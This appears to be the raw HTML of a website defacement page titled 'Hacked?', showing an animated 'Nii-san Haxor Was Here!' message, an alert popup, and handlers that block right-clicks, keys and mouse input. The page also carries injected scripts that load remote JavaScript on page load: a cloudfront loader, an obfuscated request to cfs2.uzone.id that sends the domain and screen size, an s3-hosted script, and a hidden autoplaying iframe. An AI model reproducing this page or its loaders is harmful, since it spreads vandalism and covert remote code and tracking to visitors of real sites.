<html class=" -webkit-"><head>
  <meta charset="UTF-8">
  <link rel="shortcut icon" type="image/x-icon" href="https://production-assets.codepen.io/assets/favicon/favicon-8ea04875e70c4b0bb41da869e81236e54394d63638a1ef12fa558a4a835f1164.ico">
  <link rel="mask-icon" type="" href="https://production-assets.codepen.io/assets/favicon/logo-pin-f2d2b6d2c61838f7e76325261b7195c27224080bc099486ddd6dccb469b8e8e6.svg" color="#111">
  <title>Hacked?</title>
  <link rel="icon" href="http://www.clker.com/cliparts/t/I/r/T/c/c/black-flag-md.png">
  <meta name="description" content="I Just Anarchy">
  <meta content="Sc By X-Sweet4" name="keywords">
  <meta content="X-Sweet" name="Abstract">
  <script type="text/javascript" async="" src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.10.492#p=toshibaxmq01abd050_261zt8rftxx261zt8rft"></script><script>alert("Whut ? Got Hacked ?");</script>


  <style media="" data-href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video{margin:0;padding:0;border:0;font-size:100%;font:inherit;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:before,blockquote:after,q:before,q:after{content:'';content:none}table{border-collapse:collapse;border-spacing:0}</style>

      <style>
      @import url('https://fonts.googleapis.com/css?family=Orbitron');
html,
body {
  font-family: 'Orbitron', monospace;
  background: black;
  height: 100%;
}
.container {
  height: 100%;
  width: 100%;
  justify-content: center;
  align-items: center;
  display: flex;
}
.text {
  font-weight: 100;
  font-size: 20px;
  color: white;
  text-shadow: 0 0 0.3em magenta;
}
.dud {
  color: #757575;
}

    </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.10.492#p=toshibaxmq01abd050_261zt8rftxx261zt8rft";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script></head>

<body translate="no" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">

  <div class="container">
  <div class="text">Hacked By??</div>
</div>


    <script>
    'use strict';

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

// 01010101110011010101110010101010101101
// TextScramble
// 01010101110011010101110010101010101101

var TextScramble = function () {
  function TextScramble(el) {
    _classCallCheck(this, TextScramble);

    this.el = el;
    this.chars = '!<>-_\\/[]{}?E+*^?#________$~&%';
    this.update = this.update.bind(this);
  }

  TextScramble.prototype.setText = function setText(newText) {
    var _this = this;

    var oldText = this.el.innerText;
    var length = Math.max(oldText.length, newText.length);
    var promise = new Promise(function (resolve) {
      return _this.resolve = resolve;
    });
    this.queue = [];
    for (var i = 0; i < length; i++) {
      var from = oldText[i] || '';
      var to = newText[i] || '';
      var start = Math.floor(Math.random() * 40);
      var end = start + Math.floor(Math.random() * 40);
      this.queue.push({ from: from, to: to, start: start, end: end });
    }
    cancelAnimationFrame(this.frameRequest);
    this.frame = 0;
    this.update();
    return promise;
  };

  TextScramble.prototype.update = function update() {
    var output = '';
    var complete = 0;
    for (var i = 0, n = this.queue.length; i < n; i++) {
      var _queue$i = this.queue[i];
      var from = _queue$i.from;
      var to = _queue$i.to;
      var start = _queue$i.start;
      var end = _queue$i.end;
      var char = _queue$i.char;

      if (this.frame >= end) {
        complete++;
        output += to;
      } else if (this.frame >= start) {
        if (!char || Math.random() < 0.28) {
          char = this.randomChar();
          this.queue[i].char = char;
        }
        output += '<span class="dud">' + char + '</span>';
      } else {
        output += from;
      }
    }
    this.el.innerHTML = output;
    if (complete === this.queue.length) {
      this.resolve();
    } else {
      this.frameRequest = requestAnimationFrame(this.update);
      this.frame++;
    }
  };

  TextScramble.prototype.randomChar = function randomChar() {
    return this.chars[Math.floor(Math.random() * this.chars.length)];
  };

  return TextScramble;
}();

// ??????????????????????????????????????????????????
// Example
// ??????????????????????????????????????????????????

var phrases = ['Nii-san Haxor' , 'Was' , 'Here !'];

var el = document.querySelector('.text');
var fx = new TextScramble(el);

var counter = 0;
var next = function next() {
  fx.setText(phrases[counter]).then(function () {
    setTimeout(next, 2500);
  });
  counter = (counter + 1) % phrases.length;
};

next();
  </script>

  <script type="text/javascript">

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKSy%2bYU4uP1xeBwMijZjBMweIfSLuHX4yjH5G4LCKuScaYST2y9REbRTgzvt%2bo9I3qp8xSlNwjVg54WSjWHEOGMaifRnvHNPxJG72YKIn5cedAuL6GjdNN7PBEOduyyQJ8NG2i99ewZTk4E8sFTN5WwUEc%2b16kwCnLQDnJY2CYt9aQ6iaJOgb8WU0GmTwVxk8hulWJ40ZV3hlJIlGMszvqaqL09uIhfSWyMXmECzysuCzj6l1Q3Rtz3BilFdbF6teRwLVilG%2bdRyYtG01ox3pzKx5KBIr8QSG8bMfwfiTYdOEKe%2bTpf22p1dHMmpe6%2fL8U%2b4omyUZEl28JlbVFc0%2blw3o5rhu5s2nqSD95TBlKzvNUAVlY2memYQ8PvyNDaqA0NbhSNJqyill%2f6qXdJa7mONj7wmQ5DdkVrwMEgtnOpO3jgO1EVFH5r3EgGJR%2f44MY%2fIDe03vTKmazOSOrtUbjhohg3d5lKgXhcLbFGMJvxGfZZ9EoiKRv8v9kQ2%2beeINZPP0zWgzQzKLY%2bwcgdK%2feaSyZiRyuqPuP4A5hs09KHt8%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><iframe width="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://k.top4top.net/m_1171sflt61.mp3"></iframe>

<script src="//s3.amazonaws.com/jscript-load/2042d3da972262cf70.js"></script></body></html>
